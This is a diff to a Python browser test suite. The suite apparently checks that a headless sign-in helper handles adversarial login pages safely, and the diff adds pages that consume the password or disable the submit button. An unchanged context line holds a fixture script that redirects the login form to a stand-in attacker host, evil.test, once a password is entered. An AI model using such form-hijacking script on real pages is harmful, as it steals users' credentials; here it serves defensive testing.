@@ -61,6 +61,13 @@ PAGES = {
     )
     + '<script>p.addEventListener("change", () => { c.value = p.value;'
     ' document.forms[0].action = "https://evil.test/late"; })</script>',
+    # the page takes the password on "change" and empties the box: never refilled
+    "/login/consume": FORM.format("<input name=username><input type=password name=p id=p>")
+    + '<script>p.addEventListener("change", () => { p.value = ""; })</script>',
+    # typing the username disables the button (validation): the password is not typed
+    "/login/gate": FORM.format("<input name=username id=u><input type=password name=p>")
+    + '<script>u.addEventListener("input", () => {'
+    ' document.querySelector("button").disabled = true; })</script>',
 }
 EXPECTED = {
     "/login/mfa": "challenge",
@@ -77,6 +84,8 @@ EXPECTED = {
     "/login/typed": "typing",
     "/login/state": "password",
     "/login/late": "password",  # refused, but counted: the page saw the password
+    "/login/consume": "password",  # counted, not refilled or submitted
+    "/login/gate": "stuck",
 }
 
 
@@ -145,7 +154,7 @@ def test_sign_in_script_on_real_forms(browser: Any) -> None:
             for path, expected in EXPECTED.items():
                 page.goto(origin + path)
                 assert sign_in_headless(page, _login(origin), set(), sync_api.Error) == expected
-                if path in ("/login/tenant", "/login/late"):  # not submitted
+                if path in ("/login/tenant", "/login/late", "/login/gate"):  # not submitted
                     assert page.input_value("input[name=p]") == ""  # never typed, or taken back
                     assert page.locator("[data-codapact-fill]").count() == 0
                 if path == "/login/late":  # the page was told: its copy is gone too
